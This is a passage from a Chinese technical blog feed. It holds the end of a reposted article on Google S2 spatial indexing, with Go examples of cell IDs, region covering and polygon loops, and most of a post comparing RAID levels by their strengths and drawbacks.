id="4-8、-S2-Cell-举例"><a href="#4-8、-S2-Cell-举例" class="headerlink" title="4.8、 S2 Cell 举例"></a>4.8、 S2 Cell 举例</h3><p>先来看看经纬度和 CellID 的转换，以及矩形面积的计算。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">latlng := s2.LatLngFromDegrees(<span class="number">31.232135</span>, <span class="number">121.41321700000003</span>)</span><br><span class="line">cellID := s2.CellIDFromLatLng(latlng)</span><br><span class="line">cell := s2.CellFromCellID(cellID) <span class="comment">//9279882742634381312</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// cell.Level()</span></span><br><span class="line">fmt.Println(<span class="string">&quot;latlng = &quot;</span>, latlng)</span><br><span class="line">fmt.Println(<span class="string">&quot;cell level = &quot;</span>, cellID.Level())</span><br><span class="line">fmt.Printf(<span class="string">&quot;cell = %d\n&quot;</span>, cellID)</span><br><span class="line">smallCell := s2.CellFromCellID(cellID.Parent(<span class="number">10</span>))</span><br><span class="line">fmt.Printf(<span class="string">&quot;smallCell level = %d\n&quot;</span>, smallCell.Level())</span><br><span class="line">fmt.Printf(<span class="string">&quot;smallCell id = %b\n&quot;</span>, smallCell.ID())</span><br><span class="line">fmt.Printf(<span class="string">&quot;smallCell ApproxArea = %v\n&quot;</span>, smallCell.ApproxArea())</span><br><span class="line">fmt.Printf(<span class="string">&quot;smallCell AverageArea = %v\n&quot;</span>, smallCell.AverageArea())</span><br><span class="line">fmt.Printf(<span class="string">&quot;smallCell ExactArea = %v\n&quot;</span>, smallCell.ExactArea())</span><br></pre></td></tr></table></figure><p>这里 Parent 方法参数可以直接指定返回改点的对应 level 的 CellID。</p><p>上面那些方法打印出来的结果如下：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">latlng =  [<span class="number">31.2321350</span>, <span class="number">121.4132170</span>]</span><br><span class="line">cell level =  <span class="number">30</span></span><br><span class="line">cell = <span class="number">3869277663051577529</span></span><br><span class="line"></span><br><span class="line">****Parent **** <span class="number">10000000000000000000000000000000000000000</span></span><br><span class="line">smallCell level = <span class="number">10</span></span><br><span class="line">smallCell id = <span class="number">11010110110010011011110000000000000000000000000000000000000000</span></span><br><span class="line">smallCell ApproxArea = <span class="number">1.9611002454714756e-06</span></span><br><span class="line">smallCell AverageArea = <span class="number">1.997370817559429e-06</span></span><br><span class="line">smallCell ExactArea = <span class="number">1.9611009480261058e-06</span></span><br></pre></td></tr></table></figure><p>再举一个覆盖多边形的例子。我们先随便创建一个区域。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">rect = s2.RectFromLatLng(s2.LatLngFromDegrees(<span class="number">48.99</span>, <span class="number">1.852</span>))</span><br><span class="line">rect = rect.AddPoint(s2.LatLngFromDegrees(<span class="number">48.68</span>, <span class="number">2.75</span>))</span><br><span class="line"></span><br><span class="line">rc := &amp;s2.RegionCoverer&#123;MaxLevel: <span class="number">20</span>, MaxCells: <span class="number">10</span>, MinLevel: <span class="number">2</span>&#125;</span><br><span class="line">r := s2.Region(rect.CapBound())</span><br><span class="line">covering := rc.Covering(r)</span><br></pre></td></tr></table></figure><p>覆盖参数设置成 level 2 - 20，最多的 Cell 的个数是10个。</p><p><img src="https://cdn.bugwz.com/geohash-s2-69.png" alt="10个Cell"></p><p>接着我们把 Cell 至多改成20个。</p><p><img src="https://cdn.bugwz.com/geohash-s2-70.png" alt="20个Cell"></p><p>最后再改成30个。</p><p><img src="https://cdn.bugwz.com/geohash-s2-71.png" alt="30个Cell"></p><p>可以看到相同的 level 的范围，cell 个数越多越精确目标范围。</p><p>这里是匹配矩形区域，匹配圆形区域也同理。</p><p><img src="https://cdn.bugwz.com/geohash-s2-72.png" alt="匹配圆形区域Cell为10"></p><p><img src="https://cdn.bugwz.com/geohash-s2-73.png" alt="匹配圆形区域Cell为100"></p><p>代码就不贴了，与矩形类似。这种功能 Geohash 就做不到，需要自己手动实现了。</p><p>最后举一个多边形匹配的例子。</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">testLoop</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">ll1 := s2.LatLngFromDegrees(<span class="number">31.803269</span>, <span class="number">113.421145</span>)</span><br><span class="line">ll2 := s2.LatLngFromDegrees(<span class="number">31.461846</span>, <span class="number">113.695803</span>)</span><br><span class="line">ll3 := s2.LatLngFromDegrees(<span class="number">31.250756</span>, <span class="number">113.756228</span>)</span><br><span class="line">ll4 := s2.LatLngFromDegrees(<span class="number">30.902604</span>, <span class="number">113.997927</span>)</span><br><span class="line">ll5 := s2.LatLngFromDegrees(<span class="number">30.817726</span>, <span class="number">114.464846</span>)</span><br><span class="line">ll6 := s2.LatLngFromDegrees(<span class="number">30.850743</span>, <span class="number">114.76697</span>)</span><br><span class="line">ll7 := s2.LatLngFromDegrees(<span class="number">30.713884</span>, <span class="number">114.997683</span>)</span><br><span class="line">ll8 := s2.LatLngFromDegrees(<span class="number">30.430111</span>, <span class="number">115.42615</span>)</span><br><span class="line">ll9 := s2.LatLngFromDegrees(<span class="number">30.088491</span>, <span class="number">115.640384</span>)</span><br><span class="line">ll10 := s2.LatLngFromDegrees(<span class="number">29.907713</span>, <span class="number">115.656863</span>)</span><br><span class="line">ll11 := s2.LatLngFromDegrees(<span class="number">29.783833</span>, <span class="number">115.135012</span>)</span><br><span class="line">ll12 := s2.LatLngFromDegrees(<span class="number">29.712295</span>, <span class="number">114.728518</span>)</span><br><span class="line">ll13 := s2.LatLngFromDegrees(<span class="number">29.55473</span>, <span class="number">114.24512</span>)</span><br><span class="line">ll14 := s2.LatLngFromDegrees(<span class="number">29.530835</span>, <span class="number">113.717776</span>)</span><br><span class="line">ll15 := s2.LatLngFromDegrees(<span class="number">29.55473</span>, <span class="number">113.3772</span>)</span><br><span class="line">ll16 := s2.LatLngFromDegrees(<span class="number">29.678892</span>, <span class="number">112.998172</span>)</span><br><span class="line">ll17 := s2.LatLngFromDegrees(<span class="number">29.941039</span>, <span class="number">112.349978</span>)</span><br><span class="line">ll18 := s2.LatLngFromDegrees(<span class="number">30.040949</span>, <span class="number">112.025882</span>)</span><br><span class="line">ll19 := s2.LatLngFromDegrees(<span class="number">31.803269</span>, <span class="number">113.421145</span>)</span><br><span class="line"></span><br><span class="line">point1 := s2.PointFromLatLng(ll1)</span><br><span class="line">point2 := s2.PointFromLatLng(ll2)</span><br><span class="line">point3 := s2.PointFromLatLng(ll3)</span><br><span class="line">point4 := s2.PointFromLatLng(ll4)</span><br><span class="line">point5 := s2.PointFromLatLng(ll5)</span><br><span class="line">point6 := s2.PointFromLatLng(ll6)</span><br><span class="line">point7 := s2.PointFromLatLng(ll7)</span><br><span class="line">point8 := s2.PointFromLatLng(ll8)</span><br><span class="line">point9 := s2.PointFromLatLng(ll9)</span><br><span class="line">point10 := s2.PointFromLatLng(ll10)</span><br><span class="line">point11 := s2.PointFromLatLng(ll11)</span><br><span class="line">point12 := s2.PointFromLatLng(ll12)</span><br><span class="line">point13 := s2.PointFromLatLng(ll13)</span><br><span class="line">point14 := s2.PointFromLatLng(ll14)</span><br><span class="line">point15 := s2.PointFromLatLng(ll15)</span><br><span class="line">point16 := s2.PointFromLatLng(ll16)</span><br><span class="line">point17 := s2.PointFromLatLng(ll17)</span><br><span class="line">point18 := s2.PointFromLatLng(ll18)</span><br><span class="line">point19 := s2.PointFromLatLng(ll19)</span><br><span class="line"></span><br><span class="line">points := []s2.Point&#123;&#125;</span><br><span class="line">points = <span class="built_in">append</span>(points, point19)</span><br><span class="line">points = <span class="built_in">append</span>(points, point18)</span><br><span class="line">points = <span class="built_in">append</span>(points, point17)</span><br><span class="line">points = <span class="built_in">append</span>(points, point16)</span><br><span class="line">points = <span class="built_in">append</span>(points, point15)</span><br><span class="line">points = <span class="built_in">append</span>(points, point14)</span><br><span class="line">points = <span class="built_in">append</span>(points, point13)</span><br><span class="line">points = <span class="built_in">append</span>(points, point12)</span><br><span class="line">points = <span class="built_in">append</span>(points, point11)</span><br><span class="line">points = <span class="built_in">append</span>(points, point10)</span><br><span class="line">points = <span class="built_in">append</span>(points, point9)</span><br><span class="line">points = <span class="built_in">append</span>(points, point8)</span><br><span class="line">points = <span class="built_in">append</span>(points, point7)</span><br><span class="line">points = <span class="built_in">append</span>(points, point6)</span><br><span class="line">points = <span class="built_in">append</span>(points, point5)</span><br><span class="line">points = <span class="built_in">append</span>(points, point4)</span><br><span class="line">points = <span class="built_in">append</span>(points, point3)</span><br><span class="line">points = <span class="built_in">append</span>(points, point2)</span><br><span class="line">points = <span class="built_in">append</span>(points, point1)</span><br><span class="line"></span><br><span class="line">loop := s2.LoopFromPoints(points)</span><br><span class="line"></span><br><span class="line">fmt.Println(<span class="string">&quot;----  loop search (gets too much) -----&quot;</span>)</span><br><span class="line"><span class="comment">// fmt.Printf(&quot;Some loop status items: empty:%t   full:%t \n&quot;, loop.IsEmpty(), loop.IsFull())</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ref: https://github.com/golang/geo/issues/14#issuecomment-257064823</span></span><br><span class="line">defaultCoverer := &amp;s2.RegionCoverer&#123;MaxLevel: <span class="number">20</span>, MaxCells: <span class="number">1000</span>, MinLevel: <span class="number">1</span>&#125;</span><br><span class="line"><span class="comment">// rg := s2.Region(loop.CapBound())</span></span><br><span class="line"><span class="comment">// cvr := defaultCoverer.Covering(rg)</span></span><br><span class="line">cvr := defaultCoverer.Covering(loop)</span><br><span class="line"></span><br><span class="line"><span class="comment">// fmt.Println(poly.CapBound())</span></span><br><span class="line"><span class="keyword">for</span> _, c3 := <span class="keyword">range</span> cvr &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;%d,\n&quot;</span>, c3)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到了 Loop 类，这个类的初始化的最小单元是 Point，Point 是由经纬度产生的。<strong>最重要的一点需要注意的是，多边形是按照逆时针方向，左手边区域确定的。</strong></p><p>如果一不小心点是按照顺时针排列的话，那么多边形确定的是外层更大的面，意味着球面除去画的这个多边形以外的都是你想要的多边形。</p><p>举个具体的例子，假如我们想要画的多边形是下图这个样子的：</p><p><img src="https://cdn.bugwz.com/geohash-s2-74.png" alt="多边形示例"></p><p>如果我们用顺时针的方式依次存储 Point 的话，并用顺时针的这个数组去初始化 Loop，那么就会出现“奇怪”的现象。如下图：</p><p><img src="https://cdn.bugwz.com/geohash-s2-75.png" alt="多边形示例"></p><p>这张图左上角的顶点和右下角的顶点在地球上是重合的。如果把这个地图重新还原成球面，那么就是整个球面中间挖空了一个多边形。</p><p>把上图放大，如下图：</p><p><img src="https://cdn.bugwz.com/geohash-s2-76.png" alt="多边形示例"></p><p>这样就可以很清晰的看到了，中间被挖空了一个多边形。造成这种现象的原因就是按照顺时针的方向存储了每个点，那么初始化一个 Loop 的时候就会选择多边形外圈的更大的多边形。</p><p>使用 Loop 一定要切记，<strong>顺时针表示的是外圈多边形，逆时针表示的是内圈多边形。</strong></p><p>多边形覆盖的问题同之前举的例子一样：</p><p>相同的 MaxLevel &#x3D; 20，MinLevel &#x3D; 1，MaxCells 不同，覆盖的精度就不同，下图是 MaxCells &#x3D; 100 的情况：</p><p><img src="https://cdn.bugwz.com/geohash-s2-77.png" alt="多边形示例"></p><p>下图是 MaxCells &#x3D; 1000 的情况：</p><p><img src="https://cdn.bugwz.com/geohash-s2-78.png" alt="多边形示例"></p><p>从这个例子也可以看出来 相同的 Level 范围，MaxCells 越精度，覆盖的精度越高。</p><h3 id="4-9、-S2-的应用"><a href="#4-9、-S2-的应用" class="headerlink" title="4.9、 S2 的应用"></a>4.9、 S2 的应用</h3><p><img src="https://cdn.bugwz.com/geohash-s2-79.png" alt="空间"></p><p>S2 主要能用在以下 8 个地方：</p><ol><li>涉及到角度，间隔，纬度经度点，单位矢量等的表示，以及对这些类型的各种操作。</li><li>单位球体上的几何形状，如球冠（“圆盘”），纬度 - 经度矩形，折线和多边形。</li><li>支持点，折线和多边形的任意集合的强大的构造操作（例如联合）和布尔谓词（例如，包含）。</li><li>对点，折线和多边形的集合进行快速的内存索引。</li><li>针对测量距离和查找附近物体的算法。</li><li>用于捕捉和简化几何的稳健算法（该算法具有精度和拓扑保证）。</li><li>用于测试几何对象之间关系的有效且精确的数学谓词的集合。</li><li>支持空间索引，包括将区域近似为离散“S2单元”的集合。此功能可以轻松构建大型分布式空间索引。</li></ol><p>最后一点空间索引相信在工业生产中使用的非常广泛。</p><p>S2 目前应用比较多，用在和地图相关业务上更多。Google Map 就直接大量使用了 S2 ，速度有多快读者可以自己体验体验。Uber 在搜寻最近的出租车也是用的 S2 算法进行计算的。场景的例子就是本篇文章引语里面提到的场景。滴滴应该也有相关的应用，也许有更加优秀的解法。现在很火的共享单车也会用到这些空间索引算法。</p><p>最后就是外卖行业和地图关联也很密切。美团和饿了么相信也在这方面有很多应用，具体哪里用到了，就请读者自己想象吧。</p><p>当然 S2 也有不适合的使用场景：</p><ul><li>平面几何问题（有许多精细的现有平面几何图库可供选择）；</li><li>转换常见的 to&#x2F;from GIS格式（要阅读这种格式，请使用<a href="http://gdal.org/1.11/ogr/">OGR</a>等外部库）；</li></ul><h2 id="五、-最后"><a href="#五、-最后" class="headerlink" title="五、 最后"></a>五、 最后</h2><p><img src="https://cdn.bugwz.com/geohash-s2-80.png" alt="最后"></p><p>本篇文章里面着重介绍了谷歌的 S2 算法的基础实现。虽然 Geohash 也是空间点索引算法，但是性能方面比谷歌的 S2 略逊一筹。并且大公司的数据库也基本上开始采用谷歌的 S2 算法进行索引。</p><p>关于空间搜索其实还有一大类问题，如何搜索多维空间线，多维空间面，多维空间多边形呢？他们都是由无数个空间点组成的。实际的例子，比如街道，高楼，铁路，河流。要搜索这些东西，数据库表如何设计？如何做到高效的搜索呢？还能用 B+ 树来做么？</p><p>答案当然是也可以实现高效率的搜索，那就需要用到 R 树，或者 R 树 和 B+树。</p><p>这部分就不在本文的范畴内了，下次有空可以再分享一篇《多维空间多边形索引算法》</p><p>最后，请大家多多指点。</p><hr><p>Reference：<br><a href="https://en.wikipedia.org/wiki/Z-order_curve">Z-order curve</a><br><a href="https://en.wikipedia.org/wiki/Geohash">Geohash wikipedia</a><br><a href="https://en.wikipedia.org/wiki/Geohash-36">Geohash-36</a><br><a href="http://geohash.gofreerange.com/">Geohash 在线演示</a><br><a href="http://www.movable-type.co.uk/scripts/geohash.html">Geohash 查询</a><br><a href="http://geohash.co/">Geohash Converter</a><br><a href="https://en.wikipedia.org/wiki/Space-filling_curve">Space-filling curve</a><br><a href="https://en.wikipedia.org/wiki/List_of_fractals_by_Hausdorff_dimension">List of fractals by Hausdorff dimension</a><br><a href="https://www.youtube.com/watch?v=3s7h2MHQtxc">介绍希尔伯特曲线的Youtube视频</a><br><a href="http://bit-player.org/extras/hilbert/hilbert-mapping.html">希尔伯特曲线在线演示</a><br><a href="http://www4.ncsu.edu/~njrose/pdfFiles/HilbertCurve.pdf">希尔伯特曲线论文</a><br><a href="http://bit-player.org/2013/mapping-the-hilbert-curve">Mapping the Hilbert curve</a><br><a href="https://docs.google.com/presentation/d/1Hl4KapfAENAOf4gv-pSngKwvS_jwNVHRPZTTDzXXn6Q/view#slide=id.i22">S2 谷歌官方PPT</a><br><a href="https://github.com/golang/geo"> Go 版 S2 源码 github.com&#x2F;golang&#x2F;geo</a><br><a href="https://github.com/google/s2-geometry-library-java"> Java 版 S2 源码 github.com&#x2F;google&#x2F;s2-geometry-library-java</a><br><a href="http://numerical.recipes/whp/HuiliersTheorem.pdf">L’Huilier’s Theorem</a></p><p>本文转自：<a href="https://halfrost.com/go_spatial_search/">https://halfrost.com/go_spatial_search/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
            <tag> GeoHash </tag>
            
            <tag> Google S2 </tag>
            
            <tag> Linu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RAID技术的对比解析</title>
      <link href="/2019/11/25/raidX/"/>
      <url>/2019/11/25/raidX/</url>
      
        <content type="html"><![CDATA[<p><a href="https://en.wikipedia.org/wiki/David_Patterson_(computer_scientist)">D. A. Patterson</a> 教授等人于1988年首次在论文 <a href="https://www.cs.cmu.edu/~garth/RAIDpaper/Patterson88.pdf">A Case of Redundant Array of Inexpensive Disks</a> 中提出了RAID概念，即廉价冗余磁盘阵列（ Redundant Array of Inexpensive Disks ）。 RAID 的基本思想是将多个容量较小、相对廉价的磁盘进行有机组合，从而以较低的成本获得与昂贵大容量磁盘相当的容量、性能和可靠性。随着磁盘成本和价格的不断降低， RAID概念中的廉价已经毫无意义。因此， RAID 咨询委员会（ RAID Advisory Board, RAB ）决定用<code>独立</code>替代<code>廉价</code> ，于时 RAID 变成了独立磁盘冗余阵列（ Redundant Array of Independent Disks ）。</p><p><a href="https://en.wikipedia.org/wiki/David_Patterson_(computer_scientist)">D. A. Patterson</a> 等的论文中定义了 <code>RAID1</code> ~ <code>RAID5</code> 原始 <code>RAID</code> 等级， 1988 年以来又扩展了 <code>RAID0</code> 和 <code>RAID6</code> 。近年来，存储厂商不断推出诸如 <code>RAID7</code> 、 <code>RAID10/01</code> 、 <code>RAID50</code> 、 <code>RAID53</code> 、 <code>RAID100</code> 等 <code>RAID</code> 等级。但这些并无统一的标准。目前业界公认的标准是 <code>RAID0</code> ~ <code>RAID5</code> ，除 <code>RAID2</code> 外的四个等级被定为工业标准，而在实际应用领域中使用最多的 RAID 等级是 <code>RAID0</code> 、 <code>RAID1</code> 、 <code>RAID3</code> 、 <code>RAID5</code> 、 <code>RAID6</code> 和 <code>RAID10</code>。</p><h2 id="一、RAID-0"><a href="#一、RAID-0" class="headerlink" title="一、RAID 0"></a>一、RAID 0</h2><p><code>RAID 0</code>实际上并没有提供任何冗余，它只是将多个磁盘组成一个大容量的磁盘。使用<code>RAID 0</code>后，多个磁盘可以同时读写，所以提高了磁盘的读写性能。<code>RAID 0</code>至少需要两块磁盘。</p><ul><li><p>优点：</p><ul><li>可以将多个磁盘当成一个大容量的磁盘来使用；</li><li>读写性能有极大的提高；</li></ul></li><li><p>缺点：</p><ul><li>增加了数据的丢失风险，一旦阵列中的一块磁盘故障，整个阵列的数据将无法恢复；</li><li>不建议将其作为系统盘，也不建议用来保存有价值的数据；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-0.png" alt="RAID 0" style="zoom:50%;" /><h2 id="二、RAID-1"><a href="#二、RAID-1" class="headerlink" title="二、RAID 1"></a>二、RAID 1</h2><p><code>RAID 1</code>在写入数据的时候，会同时将数据写入<code>工作盘</code>和<code>镜像盘</code>，每一个<code>工作盘</code>都有一个对应的<code>镜像盘</code>，<code>工作盘</code>和<code>镜像盘</code>保存的数据内容是完全一样的。当<code>工作盘</code>发生故障时，可以从<code>镜像盘</code>读取数据。显然，使用<code>RAID 1</code>后，磁盘的利用率为<code>50%</code>，即有效存储空间变成原来的一半了。<code>RAID 1</code>至少需要两块磁盘。</p><ul><li><p>优点：</p><ul><li>读取速度有极大的提高（有时甚至比<code>RAID 0</code>更高）；</li><li>通过镜像的方式提供了<code>冗余</code>功能；</li></ul></li><li><p>缺点：</p><ul><li>与<code>RAID 0</code>相比，<code>RAID 1</code>的写速度较低；</li><li>通过镜像的方式提供冗余功能，意味着在冗余上花费了很多成本；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-1.png" alt="RAID 1" style="zoom:50%;" /><h2 id="三、RAID-2"><a href="#三、RAID-2" class="headerlink" title="三、RAID 2"></a>三、RAID 2</h2><p><code>RAID 2</code> 称为<code>纠错海明码磁盘阵列</code>，其设计思想是利用<code>海明码</code>实现数据校验冗余。<code>海明码</code>是一种在原始数据中加入若干校验码来进行错误检测和纠正的编码技术，其中第 <code>2n</code> 位（ 1, 2, 4, 8, … ）是<code>校验码</code>，其他位置是<code>数据码</code>。因在 <code>RAID 2</code> 中，数据按位存储，每块磁盘存储<code>一位</code>数据编码，磁盘数量取决于所设定的<code>数据存储宽度</code>，可由用户设定。下图中展示了数据宽度为 <code>4</code> 的 <code>RAID 2</code> ，它需要 <code>4</code> 块<code>数据盘</code>和 <code>3</code> 块<code>校验盘</code>。如果是 <code>64 位数据宽度</code>，则需要 <code>64 块数据盘</code>和 <code>7 块校验盘</code>。可见， <code>RAID2</code> 的数据宽度越大，存储空间利用率越高，但同时需要的磁盘数量也越多。</p><ul><li><p>优点：</p><ul><li>海明码自身具备纠错能力，可以在数据发生错误的情况下对纠正错误，保证数据的安全性；</li><li>数据传输性能相当高，设计复杂性要低于 <code>RAID 3</code> 、 <code>RAID 4</code> 和 <code>RAID 5</code> ；</li></ul></li><li><p>缺点：</p><ul><li>海明码的数据冗余开销太大，数据输出性能受阵列中最慢磁盘驱动器的限制；</li><li>海明码是按位运算，数据重建非常耗时；</li><li>大部分磁盘驱动器本身都具备了纠错功能，<code>RAID 2</code>使用海明码的数据纠错功能略显多余；</li><li><code>RAID2</code> 在实际中很少应用，没有形成商业产品，目前主流存储磁盘阵列均不提供 <code>RAID2</code> 支持；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-2.png" alt="RAID 2" style="zoom:50%;" /><h2 id="四、RAID-3"><a href="#四、RAID-3" class="headerlink" title="四、RAID 3"></a>四、RAID 3</h2><p><code>RAID 3</code>使用<code>专用校验盘</code>的<code>并行访问阵列</code>，它采用一个专用的磁盘作为<code>校验盘</code>，其余磁盘作为<code>数据盘</code>，数据以位或字节为单位进行分割存储在各个数据盘中。<code>RAID 3</code>至少需要<code>三块磁盘</code>，不同磁盘上同一带区的数据作 <code>XOR 校验</code>，校验值写入<code>校验盘</code>中。</p><ul><li>优点：<ul><li>磁盘状态完好时，读性能与<code>RAID 0</code>完全一致，并行从多个磁盘条带读取数据，性能非常高，同时还提供了<code>数据容错</code>能力；</li><li>某一磁盘出现故障，不会影响数据读取，可以借助校验数据和其他完好数据来重建数据；</li><li>校验盘只需要一个，阵列的存储空间利用率高，并且由于并行访问的特征，能够高性能的高带宽的大量读写；</li><li>适用大容量数据的顺序访问应用，如影像处理、流媒体服务等；</li></ul></li><li>缺点：<ul><li>写入数据时，必须计算与所有同条带的校验值，并将新校验值写入校验盘中，一次写操作包含了写数据块、读取同条带的数据块、计算校验值、写入校验值等多个操作，系统开销大，性能低；</li><li>出现坏盘时性能会大幅下降；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-3.png" alt="RAID 3" style="zoom:50%;" /><h2 id="五、RAID-4"><a href="#五、RAID-4" class="headerlink" title="五、RAID 4"></a>五、RAID 4</h2><p><code>RAID 4</code> 与 <code>RAID 3</code>的原理大致相同，区别在于<code>条带化</code>的方式不同。 <code>RAID 4</code>按照<code>块方式</code>来组织数据，写操作只涉及当前<code>数据盘</code>和<code>校验盘</code>两个盘，多个 I&#x2F;O 请求可以同时得到处理，提高了系统性能。<code>RAID 4</code>在不同磁盘上的同级数据块同样使用<code>XOR校验</code>，结果存储在校验盘中。写入数据时， <code>RAID 4</code>按这种方式把各磁盘上的同级数据的校验值写入校验盘，读取时进行即时校验。因此，当某块磁盘的数据块损坏， <code>RAID 4</code>可以通过校验值以及其他磁盘上的同级数据块进行数据重建。</p><ul><li>优点：<ul><li>按块存储可以保证单块的完整性，可以避免受到其他磁盘上同条带产生的不利影响；</li><li>多个<code>I/O</code>请求可以同时得到处理，提供了非常好的读性能；</li></ul></li><li>缺点：<ul><li>对于写操作， <code>RAID 4</code>只能一个磁盘一个磁盘地写，并且还要写入校验数据，因此写性能比较差；</li><li>实际应用中很少见，主流存储产品也很少使用<code>RAID 4</code>保护；</li><li>随着成员磁盘数量的增加，单一校验盘的瓶颈会十分突出，往往容易成为系统性能的瓶颈；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-4.png" alt="RAID 4" style="zoom:50%;" /><h2 id="六、RAID-5"><a href="#六、RAID-5" class="headerlink" title="六、RAID 5"></a>六、RAID 5</h2><p><code>RAID 5</code>使用<code>奇偶校验数据</code>来保障数据的恢复。通过将一个（假设为A）磁盘的校验数据保存在另一个（假设为B）磁盘上，使得在如果<code>磁盘A</code>发生了故障，则可以通过<code>磁盘B</code>上保存的校验数据恢复。显然<code>RAID 5</code>在单个磁盘发生故障时，可以恢复数据。RAID 5至少需要三块磁盘。</p><ul><li>优点：<ul><li>提供类似<code>RAID 0</code>的读取速度；</li><li>提供单个磁盘故障的恢复能力；</li><li>磁盘空间利用率要比<code>RAID 1</code>高，存储成本相对较低，是目前运用较多的一种解决方案；</li></ul></li><li>缺点：<ul><li>由于需要进行奇偶校验，所以写入数据的速度比对单个磁盘进行写入操作慢；</li><li>磁盘阵列的容量必须一样大，当容量不同时，会以最小的容量为准；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-5.png" alt="RAID 5" style="zoom:50%;" /><h2 id="七、RAID-6"><a href="#七、RAID-6" class="headerlink" title="七、RAID 6"></a>七、RAID 6</h2><p><code>RAID 6</code> 引入了<code>双重校验</code>的概念，它可以保护阵列中同时出现两个磁盘失效时，阵列仍能够继续工作，不会发生数据丢失。 <code>RAID 6</code>是在<code>RAID 5</code>的基础上为了进一步增强数据保护而设计的一种 <code>RAID</code> 方式，它可以看作是一种扩展的<code>RAID 5</code> 等级。<code>RAID 6</code>思想最常见的实现方式是采用两个独立的校验算法，假设称为<code>P</code>和<code>Q</code> ，校验数据可以分别存储在<code>两个</code>不同的<code>校验盘</code>上，或者分散存储在所有成员磁盘中。当两个磁盘同时失效时，即可通过求解两元方程来重建两个磁盘上的数据。</p><ul><li>优点：<ul><li>提供两个磁盘故障的恢复能力；</li><li>具有快速的读取性能、更高的容错能力；</li><li>主要用于对数据安全等级要求非常高的场合；</li></ul></li><li>缺点：<ul><li>写性能也较差；</li><li>由于支持数据的恢复以及校验数据的恢复，因此实现代价很高，控制器的设计也比其他方案更复杂、更昂贵；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-6.png" alt="RAID 6" style="zoom:20%;" /><h3 id="八、RAID-7"><a href="#八、RAID-7" class="headerlink" title="八、RAID 7"></a>八、RAID 7</h3><p><code>RAID 7</code> 的全称是<code>最优化的异步高 I/O 速率和高数据传输率</code>，它与其他 RAID 等级有着明显区别。它不仅仅是一种技术，它还是一个独立存储计算机，自身带的操作系统和管理工具，完全可以独立运行。</p><p><code>RAID 7</code> 的存储计算机操作系统是一套实时事件驱动操作系统，其主要用来进行系统初始化和安排 <code>RAID 7</code> 磁盘阵列的所有数据传输，并把它们转换到相应的物理存储驱动器上。 <code>RAID 7</code> 通过自身系统中的专用控制板来控制读写速度，存储计算机操作系统可使主机 I&#x2F;O 传递性能达到最佳。如果一个磁盘出现故障， RAID7 还能够自动执行恢复操作，并可管理备份磁盘的重建过程。</p><p><code>RAID 7</code> 突破了以往 RAID 标准的技术架构，采用了非同步访问，极大地减轻了数据写瓶颈，提高了 I&#x2F;O 速度。 <code>RAID 7</code> 系统内置实时操作系统还可自动对主机发送过来的读写指令进行优化处理，以智能化方式将可能被读取的数据预先读入快速缓存中，从而大大减少了磁头的转动次数，提高存储系统的 I&#x2F;O 速度。</p><p><code>RAID 7</code> 可帮助用户有效地管理日益庞大的数据存储系统，并使系统的运行效率大大提高，满足不同用户的存储需求。但是， <code>RAID 7</code> 的成本比其他 RAID 等级要高许多。另外， <code>RAID 7</code> 已被某公司注册为商标，目前仅有一家公司提供 <code>RAID 7</code> 的产品，用户没有更多的选择。技术封闭，缺乏主流专业存储厂商的参与和研发严重制约了 RAID7 的发展。</p><ul><li>优点：<ul><li>读&#x2F;写磁盘某一区域的数据时，可以迅速定位；</li><li>采用了非同步访问，极大地减轻了数据写瓶颈，提高了 I&#x2F;O 速度；</li><li>可完全独立于主机运行，不占用主机CPU资源；</li></ul></li><li>缺点：<ul><li>成本比其他 RAID 等级要高许多；</li></ul></li></ul><p><img src="https://cdn.bugwz.com/raid-7.png" alt="RAID 7"></p><h2 id="九、RAID-组合级别"><a href="#九、RAID-组合级别" class="headerlink" title="九、RAID 组合级别"></a>九、RAID 组合级别</h2><h3 id="9-1、RAID-01"><a href="#9-1、RAID-01" class="headerlink" title="9.1、RAID 01"></a>9.1、RAID 01</h3><p><code>RAID 0+1</code>是将<code>RAID 0</code>和<code>RAID 1</code>有效的组合到了一起，先使用<code>RAID 0</code>将磁盘进行条带化，然后使用<code>RAID 1</code>将磁盘镜像化，分为<code>工作盘</code>和<code>镜像盘</code>。<code>RAID 0+1</code>至少需要四块磁盘。</p><ul><li>优点：<ul><li>兼容<code>RAID 0</code>和<code>RAID 1</code>的优点，即具有较好的性能和冗余；</li><li>比<code>RAID 1+0</code>具有更好的容错能力；</li></ul></li><li>缺点：<ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为为<code>50%</code>；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-01.png" alt="RAID 01" style="zoom:50%;" /><h3 id="9-2、RAID-10"><a href="#9-2、RAID-10" class="headerlink" title="9.2、RAID 10"></a>9.2、RAID 10</h3><p><code>RAID 1+0</code>是将<code>RAID 1</code>和<code>RAID 0</code>有效的组合到了一起。先使用<code>RAID 1</code>将磁盘镜像化，然后使用<code>RAID 0</code>将镜像化后的磁盘进行条带化。<code>RAID 1+0</code>至少需要<code>四块</code>磁盘。</p><ul><li><p>优点：</p><ul><li>兼容<code>RAID 0</code>和<code>RAID 1</code>的优点，即具有较好的性能和冗余；</li></ul></li><li><p>缺点：</p><ul><li>实现比较复杂，成本比较高；</li><li>磁盘的利用率仅为<code>50%</code>；</li></ul></li></ul><img src="https://cdn.bugwz.com/raid-10.png" alt="RAID 10" style="zoom:50%;" /><h3 id="9-3、RAID-30-x2F-53"><a href="#9-3、RAID-30-x2F-53" class="headerlink" title="9.3、RAID 